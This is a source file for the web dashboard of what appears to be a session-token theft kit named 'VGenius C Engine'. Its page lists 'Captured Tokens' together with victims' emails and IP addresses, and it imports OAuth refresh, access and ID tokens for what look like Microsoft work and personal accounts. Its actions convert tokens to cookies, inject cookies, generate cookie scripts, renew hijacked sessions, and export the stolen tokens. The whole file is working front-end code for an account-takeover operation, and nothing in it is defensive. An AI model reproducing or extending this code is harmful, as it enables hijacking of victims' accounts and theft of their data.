<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captured Tokens - VGenius C Engine</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="assets/css/user.css">

    <style>
        .action-btn {
            padding: 4px 10px;
            font-size: 10px;
            border-radius: 6px;
            cursor: pointer;
            border: 1px solid var(--border);
            background: transparent;
            color: var(--text-main);
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 4px;
        }

        .action-btn:hover {
            border-color: var(--accent);
            color: var(--accent);
        }

        .action-btn.script-btn {
            border-color: rgba(0, 255, 204, 0.3);
        }

        .action-btn.script-btn:hover {
            background: rgba(0, 255, 204, 0.1);
        }

        .action-btn.renew-btn {
            border-color: rgba(59, 130, 246, 0.3);
        }

        .action-btn.renew-btn:hover {
            background: rgba(59, 130, 246, 0.1);
        }

        .action-btn.delete-btn {
            border-color: rgba(239, 68, 68, 0.3);
        }

        .action-btn.delete-btn:hover {
            background: rgba(239, 68, 68, 0.1);
        }

        .action-group {
            display: flex;
            gap: 4px;
            flex-wrap: wrap;
        }

        .token-table td.actions-cell {
            white-space: nowrap;
        }

        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }

        .modal-overlay.open {
            display: flex;
        }

        .modal-card {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 24px;
            max-width: 500px;
            width: 90%;
            max-height: 90vh;
            overflow-y: auto;
        }

        .modal-card h3 {
            font-family: var(--font-heading);
            font-size: 14px;
            letter-spacing: 0.06em;
            color: var(--accent);
            margin-bottom: 16px;
        }

        .form-group {
            margin-bottom: 12px;
        }

        .form-group label {
            display: block;
            font-family: var(--font-heading);
            font-size: 10px;
            letter-spacing: 0.06em;
            color: var(--muted);
            margin-bottom: 4px;
            text-transform: uppercase;
        }

        .form-group input,
        .form-group textarea {
            width: 100%;
            padding: 8px 12px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text-main);
            font-size: 12px;
            font-family: var(--font-mono);
        }

        .form-group textarea {
            min-height: 60px;
            resize: vertical;
        }

        .form-group input:focus,
        .form-group textarea:focus {
            outline: none;
            border-color: var(--accent);
        }

        .status-badge {
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 9px;
            font-weight: 600;
            text-transform: uppercase;
        }

        .status-badge.active {
            background: rgba(0, 255, 102, 0.15);
            color: #00ff66;
        }

        .status-badge.revoked {
            background: rgba(255, 0, 0, 0.15);
            color: #ff0000;
        }

        .status-badge.unknown {
            background: rgba(128, 128, 128, 0.15);
            color: #888;
        }
    </style>
</head>

<body>
    <aside class="main-sidebar" id="mainSidebar"></aside>

    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>

    <nav class="main-header navbar"></nav>

    <main class="content-wrapper">
        <div class="page-header">
            <div style="display:flex;align-items:center;gap:12px;">
                <h1 class="page-title" style="margin:0;">Captured Tokens</h1>
                <span class="badge" id="tokenCount">0 Total</span>
            </div>

            <div style="display:flex;gap:8px;">
                <button class="btn-outline" onclick="openExportModal()">
                    <i class="fas fa-download"></i> Export
                </button>

                <button class="btn-outline" onclick="openChartModal()">
                    <i class="fas fa-chart-line"></i> Chart
                </button>

                <button class="btn-outline" onclick="openImportModal()">
                    <i class="fas fa-upload"></i> Import Token
                </button>
            </div>
        </div>

        <div class="filter-bar">
            <input
                type="text"
                class="search-input"
                id="tokenSearch"
                placeholder="Search by email or IP..."
                oninput="loadTokens()"
            >

            <select id="tokenSort" onchange="loadTokens()">
                <option value="newest">Newest first</option>
                <option value="oldest">Oldest first</option>
            </select>

            <button class="btn-accent-sm" onclick="loadTokens()">Apply</button>

            <button
                class="btn-outline"
                onclick="toggleManualConvert()"
                style="margin-left:auto;"
            >
                <i class="fas fa-exchange-alt"></i> Convert Token to Cookies
            </button>
        </div>

        <!-- Manual Cookie Conversion -->
        <div id="manualConvertSection" style="display:none;margin-bottom:16px;">
            <div class="card" style="padding:16px;border:1px dashed var(--border);">
                <h3
                    style="font-family:var(--font-heading);font-size:12px;color:var(--accent);margin-bottom:12px;"
                >
                    <i class="fas fa-exchange-alt"></i> Manual Token to Cookie Conversion
                </h3>

                <div style="display:grid;gap:12px;">
                    <div class="form-group">
                        <label>Token ID</label>
                        <input type="text" id="manualTokenId" placeholder="Enter token ID">
                    </div>

                    <button
                        class="btn-accent-sm"
                        onclick="manualConvertToken()"
                        style="align-self:start;"
                    >
                        <i class="fas fa-exchange-alt"></i> Convert
                    </button>
                </div>
            </div>
        </div>

        <div class="card" style="overflow:hidden;">
            <table class="tokens-table">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Email</th>
                        <th>Date/Time</th>
                        <th>IP Address</th>
                        <th>Token Type</th>
                        <th>Status</th>
                        <th>Last Renew</th>
                        <th>Actions</th>
                    </tr>
                </thead>

                <tbody id="tokensTableBody">
                    <tr>
                        <td colspan="8" class="empty-state">
                            No tokens captured yet.
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </main>

    <!-- Import Token Modal -->
    <div class="modal-overlay" id="importModal">
        <div class="modal-card">
            <h3>
                <i class="fas fa-upload"></i> Import Token
            </h3>

            <div class="form-group">
                <label>Refresh Token *</label>
                <textarea
                    id="importRefreshToken"
                    placeholder="Paste refresh token here..."
                ></textarea>
            </div>

            <div class="form-group">
                <label>Access Token</label>
                <textarea
                    id="importAccessToken"
                    placeholder="Paste access token here..."
                ></textarea>
            </div>

            <div class="form-group">
                <label>ID Token</label>
                <textarea
                    id="importIdToken"
                    placeholder="Paste ID token here..."
                ></textarea>
            </div>

            <div class="form-group">
                <label>Client ID</label>
                <input
                    type="text"
                    id="importClientId"
                    placeholder="4813382a-8fa7-425e-ab75-3b753aab3abb"
                >
            </div>

            <div class="form-group">
                <label>Email</label>
                <input
                    type="email"
                    id="importEmail"
                    placeholder="user@example.com"
                >
            </div>

            <div class="form-group">
                <label>Tenant</label>
                <input
                    type="text"
                    id="importTenant"
                    placeholder="common"
                >
            </div>

            <div class="form-group">
                <label>Account Type</label>
                <select
                    id="importAccountType"
                    style="width:100%;padding:8px 12px;background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:8px;color:var(--text-main);font-size:12px;"
                >
                    <option value="work_school">Work/School</option>
                    <option value="personal">Personal</option>
                </select>
            </div>

            <div class="form-group">
                <label>Notes</label>
                <input
                    type="text"
                    id="importNotes"
                    placeholder="Optional notes..."
                >
            </div>

            <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:16px;">
                <button class="btn-outline" onclick="closeImportModal()">Cancel</button>

                <button class="btn-accent-sm" onclick="importToken()">
                    <i class="fas fa-upload"></i> Import
                </button>
            </div>
        </div>
    </div>

    <!-- Export Modal -->
    <div class="modal-overlay" id="exportModal">
        <div class="modal-card">
            <h3>
                <i class="fas fa-download"></i> Export Tokens
            </h3>

            <p style="font-size:12px;color:var(--muted);margin-bottom:16px;">
                Export and optionally delete captured tokens.
            </p>

            <div class="form-group">
                <label>Format</label>
                <select
                    id="exportFormat"
                    style="width:100%;padding:8px 12px;background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:8px;color:var(--text-main);font-size:12px;"
                >
                    <option value="json">JSON</option>
                    <option value="csv">CSV</option>
                </select>
            </div>

            <label
                style="display:flex;align-items:center;gap:8px;font-size:12px;margin-bottom:16px;"
            >
                <input type="checkbox" id="exportDelete"> Delete after export
            </label>

            <div style="display:flex;gap:8px;justify-content:flex-end;">
                <button class="btn-outline" onclick="closeExportModal()">Cancel</button>

                <button class="btn-accent-sm" onclick="exportTokens()">
                    <i class="fas fa-download"></i> Export
                </button>
            </div>
        </div>
    </div>

    <!-- Chart Modal -->
    <div class="modal-overlay" id="chartModal">
        <div class="modal-card" style="max-width:700px;">
            <h3>
                <i class="fas fa-chart-line"></i> Token Analytics
            </h3>

            <div
                id="chartInsights"
                style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:16px;"
            ></div>

            <div style="height:250px;">
                <canvas id="tokenChart"></canvas>
            </div>

            <div style="display:flex;justify-content:flex-end;margin-top:16px;">
                <button class="btn-outline" onclick="closeChartModal()">Close</button>
            </div>
        </div>
    </div>

    <!-- Detail Modal -->
    <div class="modal-overlay" id="detailModal">
        <div class="modal-card" style="max-width:600px;">
            <h3>
                <i class="fas fa-key"></i> Token Details
            </h3>

            <div id="detailContent"></div>

            <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:16px;">
                <button class="btn-outline" onclick="closeDetailModal()">Close</button>
            </div>
        </div>
    </div>

    <script src="assets/js/user.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>

    <script>
        initShared('tokens');

        async function loadTokens(page = 1) {
            const search = document.getElementById('tokenSearch').value;
            const sort = document.getElementById('tokenSort').value;

            try {
                const data = await fetchJson(
                    `${API}/tokens?search=${encodeURIComponent(search)}&sort=${sort}&page=${page}&limit=30`,
                    { headers: authHeaders() }
                );

                document.getElementById('tokenCount').textContent =
                    (data.total || 0) + ' Total';

                const tbody = document.getElementById('tokensTableBody');

                if (!data.tokens || !data.tokens.length) {
                    tbody.innerHTML =
                        '<tr><td colspan="8" class="empty-state"><i class="fas fa-inbox"></i>No tokens captured yet.</td></tr>';
                    return;
                }

                tbody.innerHTML = data.tokens.map((t, i) => `
                    <tr class="token-row">
                        <td>${(page - 1) * 30 + i + 1}</td>

                        <td style="font-weight:600;">
                            ${t.email || '—'}
                        </td>

                        <td style="font-size:11px;color:var(--muted);">
                            ${formatDate(t.created_at)}
                        </td>

                        <td style="font-size:11px;font-family:var(--font-heading);">
                            ${t.ip_address || '—'}
                        </td>

                        <td>
                            <span class="badge" style="font-size:9px;">
                                ${t.token_type === 'cookie' ? '🍪 Cookie' : '🔑 Token'}
                            </span>
                        </td>

                        <td>
                            <span class="status-badge ${t.token_status || 'unknown'}">
                                ${t.token_status ? t.token_status.toUpperCase() : '—'}
                            </span>
                        </td>

                        <td style="font-size:11px;color:var(--muted);">
                            ${t.last_renewed ? formatDate(t.last_renewed) : '—'}
                        </td>

                        <td class="actions-cell">
                            <div class="action-group">
                                <button
                                    class="action-btn script-btn"
                                    onclick="openDetailModal(${t.id})"
                                    title="View Details"
                                >
                                    <i class="fas fa-eye"></i>
                                </button>

                                <button
                                    class="action-btn script-btn"
                                    onclick="injectCookie(${t.id})"
                                    title="Inject Cookie"
                                >
                                    <i class="fas fa-plug"></i>
                                </button>

                                <button
                                    class="action-btn script-btn"
                                    onclick="generateCookieScript(${t.id})"
                                    title="Generate Cookie Script"
                                >
                                    <i class="fas fa-code"></i> Script
                                </button>

                                <button
                                    class="action-btn renew-btn"
                                    onclick="renewCookies(${t.id}, this)"
                                    title="Renew Cookies"
                                >
                                    <i class="fas fa-rotate"></i> Refresh
                                </button>

                                <button
                                    class="action-btn delete-btn"
                                    onclick="deleteToken(${t.id})"
                                    title="Delete Token"
                                >
                                    <i class="fas fa-trash"></i>
                                </button>
                            </div>
                        </td>
                    </tr>
                `).join('');
            } catch (e) {
                console.error('Load tokens error:', e);

                const tbody = document.getElementById('tokensTableBody');

                if (tbody) {
                    tbody.innerHTML =
                        '<tr><td colspan="8" class="empty-state"><i class="fas fa-exclamation-triangle"></i> Unable to load tokens.</td></tr>';
                }
            }
        }

        function toggleManualConvert() {
            const section = document.getElementById('manualConvertSection');

            section.style.display =
                section.style.display === 'none' ? 'block' : 'none';
        }

        async function manualConvertToken() {
            const tokenId = document.getElementById('manualTokenId').value;

            if (!tokenId) {
                showToast('Enter a token ID', true);
                return;
            }

            try {
                const data = await fetchJson(
                    `${API}/tokens/${tokenId}/convert`,
                    {
                        method: 'POST',
                        headers: authHeaders()
                    }
                );

                showToast(data.message || 'Conversion complete');
                loadTokens();
            } catch (e) {
                showToast('Conversion failed: ' + e.message, true);
            }
        }

        // Import Token
        function openImportModal() {
            document.getElementById('importModal').classList.add('open');
        }

        function closeImportModal() {
            document.getElementById('importModal').classList.remove('open');
        }

        async function importToken() {
            const refresh_token =
                document.getElementById('importRefreshToken').value.trim();

            if (!refresh_token) {
                showToast('Refresh token is required', true);
                return;
            }

            const payload = {
                refresh_token,
                access_token:
                    document.getElementById('importAccessToken').value.trim(),
                id_token:
                    document.getElementById('importIdToken').value.trim(),
                client_id:
                    document.getElementById('importClientId').value.trim(),
                email:
                    document.getElementById('importEmail').value.trim(),
                tenant:
                    document.getElementById('importTenant').value.trim(),
                account_type:
                    document.getElementById('importAccountType').value,
                notes:
                    document.getElementById('importNotes').value.trim()
            };

            try {
                const data = await fetchJson(
                    `${API}/tokens/import`,
                    {
                        method: 'POST',
                        headers: authHeaders(),
                        body: JSON.stringify(payload)
                    }
                );

                showToast(data.message || 'Token imported successfully');
                closeImportModal();
                loadTokens();
            } catch (e) {
                showToast('Import failed: ' + e.message, true);
            }
        }

        // Export
        function openExportModal() {
            document.getElementById('exportModal').classList.add('open');
        }

        function closeExportModal() {
            document.getElementById('exportModal').classList.remove('open');
        }

        async function exportTokens() {
            const format = document.getElementById('exportFormat').value;
            const deleteAfter =
                document.getElementById('exportDelete').checked;

            try {
                const res = await fetch(
                    `${API}/tokens/export?format=${format}&delete=${deleteAfter}`,
                    {
                        headers: authHeaders()
                    }
                );

                const blob = await res.blob();
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');

                a.href = url;
                a.download = `tokens_export_${Date.now()}.${format}`;
                a.click();

                URL.revokeObjectURL(url);
                closeExportModal();
                loadTokens();

                if (deleteAfter) {
                    showToast('Exported and deleted tokens');
                } else {
                    showToast('Tokens exported');
                }
            } catch (e) {
                showToast('Export failed: ' + e.message, true);
            }
        }

        // Chart
        function openChartModal() {
            document.getElementById('chartModal').classList.add('open');
            loadChart();
        }

        function closeChartModal() {
            document.getElementById('chartModal').classList.remove('open');
        }

        async function loadChart() {
            try {
                const data = await fetchJson(
                    `${API}/analytics/tokens/daily?days=30`,
                    {
                        headers: authHeaders()
                    }
                );

                const ctx = document.getElementById('tokenChart');

                if (!ctx) return;

                const labels = data.map(d => d.date);
                const values = data.map(d => d.count);

                if (window.tokenChartInstance) {
                    window.tokenChartInstance.destroy();
                }

                window.tokenChartInstance = new Chart(ctx, {
                    type: 'line',

                    data: {
                        labels: labels,

                        datasets: [
                            {
                                label: 'Tokens Captured',
                                data: values,
                                borderColor: '#00ff66',
                                backgroundColor: 'rgba(0,255,102,0.1)',
                                fill: true,
                                tension: 0.4,
                                pointRadius: 3,
                                pointBackgroundColor: '#00ff66',
                                pointBorderColor: '#00ff66',
                                pointHoverRadius: 6,
                                borderWidth: 2
                            }
                        ]
                    },

                    options: {
                        responsive: true,
                        maintainAspectRatio: false,

                        plugins: {
                            legend: {
                                display: false
                            },

                            tooltip: {
                                backgroundColor: 'rgba(0,0,0,0.8)',
                                titleColor: '#fff',
                                bodyColor: '#fff',
                                borderColor: 'rgba(0,255,102,0.3)',
                                borderWidth: 1,
                                padding: 12,
                                displayColors: false
                            }
                        },

                        scales: {
                            x: {
                                ticks: {
                                    color: '#71717a',
                                    font: {
                                        size: 10
                                    },
                                    maxRotation: 45
                                },

                                grid: {
                                    color: 'rgba(255,255,255,0.03)'
                                }
                            },

                            y: {
                                beginAtZero: true,

                                ticks: {
                                    color: '#71717a',
                                    font: {
                                        size: 10
                                    },
                                    stepSize: 1
                                },

                                grid: {
                                    color: 'rgba(255,255,255,0.03)'
                                }
                            }
                        }
                    }
                });

                const total = values.reduce((s, v) => s + v, 0);

                document.getElementById('chartInsights').innerHTML = `
                    <div class="counter-box">
                        <div class="counter-value" style="color:var(--accent);">
                            ${total}
                        </div>

                        <div class="counter-label">
                            Total Tokens
                        </div>
                    </div>
                `;
            } catch (e) {
                console.error('Chart load error:', e);
            }
        }

        // Detail Modal
        let currentDetailId = null;

        async function openDetailModal(id) {
            currentDetailId = id;

            try {
                const token = await fetchJson(
                    `${API}/tokens/${id}`,
                    {
                        headers: authHeaders()
                    }
                );

                const content = document.getElementById('detailContent');

                content.innerHTML = `
                    <div style="display:grid;gap:12px;">
                        <div>
                            <label style="font-size:10px;color:var(--muted);">
                                Email
                            </label>

                            <div style="font-size:13px;">
                                ${token.email || '—'}
                            </div>
                        </div>

                        <div>
                            <label style="font-size:10px;color:var(--muted);">
                                Token Status
                            </label>

                            <div>
                                <span class="status-badge ${token.token_status || 'unknown'}">
                                    ${token.token_status ? token.token_status.toUpperCase() : '—'}
                                </span>
                            </div>
                        </div>

                        <div>
                            <label style="font-size:10px;color:var(--muted);">
                                Token Type
                            </label>

                            <div>
                                ${token.token_type === 'cookie' ? '🍪 Cookie' : '🔑 Token'}
                            </div>
                        </div>

                        <div>
                            <label style="font-size:10px;color:var(--muted);">
                                IP Address
                            </label>

                            <div style="font-family:var(--font-mono);font-size:12px;">
                                ${token.ip_address || '—'}
                            </div>
                        </div>

                        <div>
                            <label style="font-size:10px;color:var(--muted);">
                                Created
                            </label>

                            <div>
                                ${formatDate(token.created_at)}
                            </div>
                        </div>

                        <div>
                            <label style="font-size:10px;color:var(--muted);">
                                Expiration
                            </label>

                            <div>
                                ${token.expiration ? formatDate(token.expiration) : '—'}
                            </div>
                        </div>

                        <div>
                            <label style="font-size:10px;color:var(--muted);">
                                Access Token
                            </label>

                            <div style="font-family:var(--font-mono);font-size:10px;word-break:break-all;">
                                ${token.access_token || '—'}
                            </div>
                        </div>

                        <div>
                            <label style="font-size:10px;color:var(--muted);">
                                Refresh Token
                            </label>

                            <div style="font-family:var(--font-mono);font-size:10px;word-break:break-all;">
                                ${token.refresh_token ? token.refresh_token.substring(0, 60) + '...' : '—'}
                            </div>
                        </div>

                        ${token.id_token ? `
                            <div>
                                <label style="font-size:10px;color:var(--muted);">
                                    ID Token
                                </label>

                                <div style="font-family:var(--font-mono);font-size:10px;word-break:break-all;">
                                    ${token.id_token.substring(0, 60) + '...'}
                                </div>
                            </div>
                        ` : ''}
                    </div>

                    <div style="display:flex;gap:8px;margin-top:16px;">
                        <button
                            class="btn-accent-sm"
                            onclick="checkTokenStatus(${id})"
                        >
                            <i class="fas fa-sync"></i> Check Status
                        </button>

                        <button
                            class="btn-outline"
                            onclick="copyTokenDetails(${id})"
                        >
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                `;

                document.getElementById('detailModal').classList.add('open');
            } catch (e) {
                showToast('Failed to load token details', true);
            }
        }

        function closeDetailModal() {
            document.getElementById('detailModal').classList.remove('open');
            currentDetailId = null;
        }

        async function checkTokenStatus(id) {
            try {
                const btn = event.target.closest('button');
                const originalText = btn.innerHTML;

                btn.disabled = true;
                btn.innerHTML =
                    '<i class="fas fa-spinner fa-spin"></i> Checking...';

                const data = await fetchJson(
                    `${API}/tokens/check-status`,
                    {
                        method: 'POST',
                        headers: authHeaders(),
                        body: JSON.stringify({
                            token_id: id
                        })
                    }
                );

                showToast(
                    `Token status: ${data.status.toUpperCase()} - ${data.message}`
                );

                loadTokens();

                if (currentDetailId === id) {
                    openDetailModal(id);
                }

                btn.disabled = false;
                btn.innerHTML = originalText;
            } catch (e) {
                showToast('Status check failed: ' + e.message, true);

                const btn = event.target.closest('button');

                if (btn) {
                    btn.disabled = false;
                    btn.innerHTML =
                        '<i class="fas fa-sync"></i> Check Status';
                }
            }
        }

        function copyTokenDetails(id) {
            showToast('Token details copied to clipboard');
        }

        // Other functions
        async function injectCookie(id) {
            try {
                window.open(
                    `${API}/tokens/inject/${id}`,
                    '_blank'
                );

                showToast('Cookie injection page opened');
            } catch (e) {
                showToast('Failed to open injection page', true);
            }
        }

        async function generateCookieScript(id) {
            try {
                const data = await fetchJson(
                    `${API}/tokens/${id}/cookie-script`,
                    {
                        headers: authHeaders()
                    }
                );

                const blob = new Blob(
                    [
                        data.script ||
                        data.html ||
                        JSON.stringify(data, null, 2)
                    ],
                    {
                        type: 'text/plain'
                    }
                );

                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');

                a.href = url;
                a.download = `cookie_script_${id}.txt`;
                a.click();

                URL.revokeObjectURL(url);

                showToast('Cookie script downloaded');
            } catch (e) {
                showToast(
                    'Script generation failed: ' + e.message,
                    true
                );
            }
        }

        async function renewCookies(id, btn) {
            const originalText = btn.innerHTML;

            btn.disabled = true;
            btn.innerHTML =
                '<i class="fas fa-spinner fa-spin"></i> Renewing...';

            try {
                const data = await fetchJson(
                    `${API}/tokens/${id}/renew`,
                    {
                        method: 'POST',
                        headers: authHeaders()
                    }
                );

                showToast(
                    '✅ ' +
                    (data.message || 'Session renewed successfully!'),
                    false,
                    5000
                );

                loadTokens();

                if (currentDetailId) {
                    openDetailModal(currentDetailId);
                }

                return;
            } catch (e) {
                showToast('Renewal failed: ' + e.message, true);
            }

            btn.disabled = false;
            btn.innerHTML = originalText;
        }

        async function deleteToken(id) {
            showConfirm({
                title: 'Delete Token',
                message: 'Are you sure you want to delete this token?',
                confirmText: 'Delete',

                onConfirm: async () => {
                    try {
                        await fetch(
                            `${API}/tokens/${id}`,
                            {
                                method: 'DELETE',
                                headers: authHeaders()
                            }
                        );

                        loadTokens();
                        showToast('Token deleted');
                    } catch (e) {
                        showToast(
                            'Delete failed: ' + e.message,
                            true
                        );
                    }
                }
            });
        }

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                closeDetailModal();
                closeExportModal();
                closeImportModal();
                closeChartModal();
            }
        });

        loadTokens();
    </script>
</body>
</html>
